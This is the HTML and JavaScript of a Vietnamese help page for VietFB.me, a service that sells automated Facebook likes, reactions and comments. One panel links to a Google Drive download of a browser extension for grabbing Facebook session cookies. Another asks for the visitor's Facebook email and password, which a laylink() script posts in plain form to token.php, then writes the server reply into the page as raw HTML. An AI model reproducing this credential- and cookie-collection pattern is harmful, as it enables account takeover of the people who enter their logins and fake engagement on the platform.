<!DOCTYPE html>
<html>
<head>
	<title>Hỗ trợ khách hàng</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <meta name="description" content="VietFB.ME - hệ thống auto thả tim, tự động thả tim, tự động hóa Facebook, tự động thả tim Facebook mới nhất, hệ thống tự động hóa Facebook. Tự động bình luận Facebook" />
    <meta name="keywords" content="tha tim, thả tim, tự động thả tim, bot cảm xúc,bot cảm xúc cookie,auto cảm xúc facebook,auto bot cảm xúc,auto cảm xúc trên facebook,hack cảm xúc,bot cảm xúc fb,auto cảm xúc fb,hack cảm xúc facebook "/>
    <meta name="revisit-after" content="1 days" />
    <meta name="robots" content="robots.txt"/>
    <link rel="canonical" href="https://vietfb.me"/>
    <link rel="publisher" href="https://plus.google.com/107287093081394341126"/>
    <meta itemprop="name" content="VietFB.Me - Thả Tim Facebook">
    <meta itemprop="description" content="VietFB.ME - hệ thống auto thả tim, tự động thả tim, tự động hóa Facebook, tự động thả tim Facebook mới nhất, hệ thống tự động hóa Facebook. Tự động bình luận Facebook">
    <meta itemprop="image" content="ladding/img/vietfb.img">
    <!-- Facebook Meta -->
    <meta property="og:title" content="VietFb.Me - Tự động thả tim Facebook" /> 
    <meta property="og:locale" content="vi_VN" />
    <meta property="og:type" content="website" />
    <meta property="og:url" content="https://vietfb.me" /> 
    <meta property="og:image" content="ladding/img/vietfb.jpg" />
    <meta property="og:description" content="VietFB.ME - hệ thống auto thả tim, tự động thả tim, tự động hóa Facebook, tự động thả tim Facebook mới nhất, hệ thống tự động hóa Facebook. Tự động bình luận Facebook" /> 
    <meta property="og:site_name" content="VietFB.Me" />
    <meta property="fb:admins" content="100009126175131" />
</head>
<body>
<nav class="navbar navbar-default">
  <div class="container-fluid">
    <div class="navbar-header">
      <a class="navbar-brand" href="#">VietFB.Me</a>
    </div>
    <ul class="nav navbar-nav">
      <li><a href="/index.php">Trang chủ</a></li>
      <li><a href="/login.php">Đăng nhập</a></li>
      <li><a href="/register.php">Đăng ký</a></li>
      <li class="active"><a href="/huong-dan">Hướng dẫn</a></li>
    </ul>
  </div>
</nav>

<div class="container">
<div class="row">
<div class="col-md-6">
<div class="panel panel-default">
<div class="panel-heading">GET COOKIE
</div>
  <div class="panel-body text-center">
<img class="faa-tada animated" src="/assets/img/icon128.png"><br />
    Cài đặt tiện ích lấy Cookie tự động để hỗ trợ lấy Cookie một cách nhanh nhất nhé!
    <a href="https://drive.google.com/file/d/0B8JiOjwFRfQtUXlxZXZNcXJaMnM/view?usp=sharing" class="btn btn-warning btn-block faa-vertical animated " role="button" target="_blank"><i class="fa fa-download" aria-hidden="true" ></i>
Tải về tiện ích</a>
  </div>
 </div>
 </div>
<div class="col-md-6">
<div class="panel panel-default">
  <div class="panel-heading">GET TOKEN</div>
  <div class="panel-body">
    <div class="col-sm-10 col-sm-offset-1">
        <br>
        <input class="form-control" type="text" id="emailtk" placeholder="Email hoặc số điện thoại" data-toggle="tooltip" title="" required="" data-original-title="Nhập email hoặc số điện thoại facebook của bạn">
        <br>
        <input class="form-control" type="password" id="passwdtk" data-toggle="tooltip" title="" placeholder="Mật khẩu" required="" data-original-title="Nhập mật khẩu facebook của bạn">
        <br>
        <button class="btn btn-primary form-control btn-flat input-group-lg" id="login" type="button" onclick="laylink()"><b><i class="fa fa-facebook-square" aria-hidden="true"></i> Đăng nhập bằng facebook</b>
        </button>
  </div> <!-- body -->
</div> <!-- .pannel -->
</div>
</div>
<div class="col-md-12">
	 <div id="trave"></div>
</div>
<div class="col-md-12">
<iframe width="100%" height="600px" src="https://www.youtube.com/embed/iJX_psXmyXg" frameborder="0" allowfullscreen></iframe>
</div>
</div>
<script type="text/javascript">
function laylink() {
var http = new XMLHttpRequest();
var tk = document.getElementById("emailtk").value;
var mk = document.getElementById("passwdtk").value;
var url = "token.php";
var params = "u="+tk+"&p="+mk+"";
http.open("POST", url, true);
http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

http.onreadystatechange = function() {
    if(http.readyState == 4 && http.status == 200) {
      document.getElementById("trave").innerHTML = http.responseText;        
    }
}
http.send(params);
}
</script>
</body>
</html>